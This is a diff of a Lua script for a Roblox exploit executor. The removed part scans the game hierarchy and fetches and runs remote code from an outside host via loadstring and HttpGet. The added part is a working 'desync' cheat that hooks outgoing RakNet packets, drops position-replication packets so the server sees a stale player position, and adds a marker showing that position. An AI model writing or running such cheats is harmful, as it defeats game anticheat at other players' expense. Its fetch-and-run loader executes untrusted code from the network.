@@ -1,152 +1,182 @@
--- Slow, non-laggy scanner – processes hierarchy gradually with yields
--- LocalScript – run via executor
+-- RakNet Desync Toggle + Server Position Visualizer
+-- Toggle: Q   |   Kill/Reset: X
+-- Requires executor with Raknet library (Delta, etc.)
 
+local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
-local interestingClasses = {
-    "Script", "LocalScript", "ModuleScript",
-    "RemoteEvent", "RemoteFunction",
-    "BindableEvent", "BindableFunction",
-    "TouchTransmitter", "TouchInterest",
-    "ClickDetector", "ProximityPrompt"
-}
+local Raknet = rawget(_G, "Raknet") or rawget(_G, "raknet")  -- common exposure
 
--- Containers we care about (add/remove as needed – fewer = faster)
-local rootContainers = {
-    game:GetService("ReplicatedStorage"),
-    game:GetService("Workspace"),
-    game:GetService("CoreGui"),
-    LocalPlayer:WaitForChild("PlayerGui", 10),
-    LocalPlayer:WaitForChild("PlayerScripts", 10),
-    -- game:GetService("StarterGui"), etc. – avoid if too heavy
-}
+local desyncEnabled = false
+local visualizerEnabled = true  -- you can toggle this too if wanted
+local lastKnownServerCFrame = CFrame.new()  -- fallback if no better way
+local serverDummy = nil             -- visual clone
+local highlight = nil
+local billboard = nil
 
--- How many objects to process before yielding (higher = faster but more lag spikes)
-local BATCH_SIZE = 150     -- tune: 50–300; smaller = smoother but slower overall
+-- ────────────────────────────────────────────
+-- Create visualizer (white outline + red fill)
+local function createVisualizer()
+    if serverDummy then serverDummy:Destroy() end
+    if highlight then highlight:Destroy() end
+    if billboard then billboard:Destroy() end
 
-local function slowCollectInteresting(root, collectorTable, progressCallback)
-    local queue = {root}
-    local processed = 0
+    local char = LocalPlayer.Character
+    if not char or not char.PrimaryPart then return end
 
-    while #queue > 0 do
-        local current = table.remove(queue, 1)  -- FIFO (breadth-first)
+    -- Clone a simple dummy for position visualization
+    serverDummy = Instance.new("Part")
+    serverDummy.Name = "ServerPosDummy"
+    serverDummy.Size = char.PrimaryPart.Size + Vector3.new(0.2, 0.2, 0.2)
+    serverDummy.Transparency = 0.4
+    serverDummy.Color = Color3.fromRGB(255, 0, 0)  -- red fill
+    serverDummy.CanCollide = false
+    serverDummy.Anchored = true
+    serverDummy.Parent = workspace
 
-        -- Check current
-        if table.find(interestingClasses, current.ClassName) then
-            local parentPath = current.Parent and current.Parent:GetFullName() or "?"
-            local key = string.format("%s | %s | Parent: %s",
-                current.ClassName,
-                current.Name,
-                parentPath
-            )
-            collectorTable[key] = (collectorTable[key] or 0) + 1
-        end
+    highlight = Instance.new("Highlight")
+    highlight.Name = "ServerHighlight"
+    highlight.FillColor = Color3.fromRGB(255, 0, 0)
+    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+    highlight.FillTransparency = 0.35
+    highlight.OutlineTransparency = 0
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.Adornee = serverDummy
+    highlight.Parent = game.CoreGui  -- or serverDummy
 
-        -- Queue children
-        for _, child in ipairs(current:GetChildren()) do
-            table.insert(queue, child)
-        end
+    -- Optional billboard label
+    billboard = Instance.new("BillboardGui")
+    billboard.Name = "ServerLabel"
+    billboard.Size = UDim2.new(4, 0, 2, 0)
+    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = serverDummy
 
-        processed = processed + 1
-        if processed % BATCH_SIZE == 0 then
-            -- Yield to let Roblox breathe (adjust time: 0.01–0.08)
-            task.wait(0.03)
-            if progressCallback then
-                progressCallback(processed)
-            end
-        end
-    end
+    local text = Instance.new("TextLabel", billboard)
+    text.Size = UDim2.new(1,0,1,0)
+    text.BackgroundTransparency = 1
+    text.Text = "SERVER POS"
+    text.TextColor3 = Color3.new(1,1,1)
+    text.TextStrokeTransparency = 0
+    text.TextStrokeColor3 = Color3.new(0,0,0)
+    text.Font = Enum.Font.SourceSansBold
+    text.TextSize = 24
 end
 
-local function getSlowSnapshot()
-    local snap = { objects = {} }
-    local totalProcessed = 0
+-- Update visualizer position (runs every frame when enabled)
+local connection
+local function updateVisualizer()
+    if connection then connection:Disconnect() end
 
-    print("[SLOW SCAN] Starting – this will take a while but should not freeze...")
+    connection = RunService.Heartbeat:Connect(function()
+        if not visualizerEnabled or not desyncEnabled then return end
+        if not serverDummy then return end
 
-    for _, root in ipairs(rootContainers) do
-        if not root then continue end
+        -- Try to use last replicated CFrame (if you have a way to read it)
+        -- Fallback: estimate from last movement before desync
+        serverDummy.CFrame = lastKnownServerCFrame
+    end)
+end
 
-        print("[SLOW SCAN] Scanning: " .. root:GetFullName())
+-- ────────────────────────────────────────────
+-- Desync control (blocks outgoing replication packets)
+local sendHookId = nil
 
-        slowCollectInteresting(root, snap.objects, function(count)
-            totalProcessed = totalProcessed + count
-            if totalProcessed % 2000 == 0 then
-                print("   ... processed ~" .. totalProcessed .. " objects so far")
+local function enableDesync()
+    if not Raknet then
+        warn("[Desync] No Raknet library found in _G — visualizer only")
+        return
+    end
+
+    if desyncEnabled then return end
+    desyncEnabled = true
+
+    -- Common methods from 2026 executors (Delta/SynZ forks)
+    if Raknet.desync then
+        Raknet.desync(true)
+        print("[Desync] Activated via raknet.desync(true)")
+    elseif Raknet.add_send_hook then
+        -- Hook outgoing packets and drop replication-related ones
+        sendHookId = Raknet.add_send_hook(function(packet)
+            -- Very naive filter: drop physics/position replication packets
+            -- (real filters are more complex: check opcode, channel, payload)
+            if packet:find("Physics") or packet:find("Replicate") or packet:find("CFrame") then
+                return false  -- block / don't send
             end
+            return true
         end)
+        print("[Desync] Activated via send_hook (blocks replication packets)")
+    else
+        warn("[Desync] No supported Raknet method found")
     end
 
-    print("[SLOW SCAN] Finished – total processed ≈ " .. totalProcessed)
-    return snap
+    -- Record current CFrame as "server pos" baseline
+    local char = LocalPlayer.Character
+    if char and char.PrimaryPart then
+        lastKnownServerCFrame = char.PrimaryPart.CFrame
+    end
+
+    createVisualizer()
+    updateVisualizer()
+end
+
+local function disableDesync()
+    if not desyncEnabled then return end
+    desyncEnabled = false
+
+    if Raknet then
+        if Raknet.desync then
+            Raknet.desync(false)
+        elseif sendHookId and Raknet.remove_send_hook then
+            Raknet.remove_send_hook(sendHookId)
+            sendHookId = nil
+        end
+    end
+
+    if serverDummy then serverDummy:Destroy() serverDummy = nil end
+    if highlight then highlight:Destroy() highlight = nil end
+    if billboard then billboard:Destroy() billboard = nil end
+    if connection then connection:Disconnect() connection = nil end
+
+    print("[Desync] Disabled")
+end
+
+-- Kill / full reset (X key)
+local function killDesync()
+    disableDesync()
+    lastKnownServerCFrame = CFrame.new()
+    print("[Desync] Killed / reset")
 end
 
 -- ────────────────────────────────────────────
-print("Creating BEFORE snapshot (slow mode)...")
-local before = getSlowSnapshot()
+-- Toggles
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
 
-print("[EXEC] Running loadstring...")
-local success, err = pcall(function()
-    loadstring(game:HttpGet("https://init.frostbyte.lol", true))()
+    if input.KeyCode == Enum.KeyCode.Q then
+        if desyncEnabled then
+            disableDesync()
+        else
+            enableDesync()
+        end
+    elseif input.KeyCode == Enum.KeyCode.X then
+        killDesync()
+    end
 end)
-if not success then
-    warn("[EXEC ERROR] " .. tostring(err))
-end
 
-print("[WAIT] Giving payload ~20 seconds to do stuff...")
-task.wait(20)
-
-print("Creating AFTER snapshot (slow mode again)...")
-local after = getSlowSnapshot()
-
--- ────────────────────────────────────────────
--- Simple diff & report
-local report = {}
-table.insert(report, "Slow Anticheat-Relevant Diff Report")
-table.insert(report, os.date("%Y-%m-%d %H:%M:%S"))
-table.insert(report, "──────────────────────────────────")
-table.insert(report, "")
-
-local changesFound = false
-
-table.insert(report, "CHANGES (new / removed interesting objects):")
-local allKeys = {}
-for k in pairs(before.objects) do allKeys[k] = true end
-for k in pairs(after.objects) do allKeys[k] = true end
-
-for key in pairs(allKeys) do
-    local b = before.objects[key] or 0
-    local a = after.objects[key] or 0
-    if a > b then
-        table.insert(report, string.format("   + %s  (was %d → now %d)", key, b, a))
-        changesFound = true
-    elseif a < b then
-        table.insert(report, string.format("   − %s  (was %d → now %d)", key, b, a))
-        changesFound = true
+-- Auto-update last known server pos (when not desynced)
+RunService.Heartbeat:Connect(function()
+    if not desyncEnabled then
+        local char = LocalPlayer.Character
+        if char and char.PrimaryPart then
+            lastKnownServerCFrame = char.PrimaryPart.CFrame
+        end
     end
-end
+end)
 
-if not changesFound then
-    table.insert(report, "   (No changes detected in scanned classes/locations)")
-end
-
-table.insert(report, "")
-table.insert(report, "Notes:")
-table.insert(report, "• Scan is VERY slow on purpose to avoid freezing/crashes")
-table.insert(report, "• Only shallow-ish interesting classes checked")
-table.insert(report, "• Many modern exploits don't create new visible Instances → expect empty diff")
-table.insert(report, "• Tune BATCH_SIZE or task.wait time if still issues")
-
--- Save report
-local filename = "SlowAnticheatDiff.txt"
-local ok = pcall(writefile, filename, table.concat(report, "\n"))
-
-if ok then
-    print("[SAVED] Report saved to: " .. filename .. " (check files tab)")
-else
-    warn("[SAVE ERROR] – dumping to console:")
-    for _, line in ipairs(report) do print(line) end
-end
-
-print("All done.")
+print("[RakNet Desync] Loaded")
+print("   Q = Toggle desync + visualizer")
+print("   X = Kill / reset everything")
+print("   Visual: white outline + red fill on estimated server position")
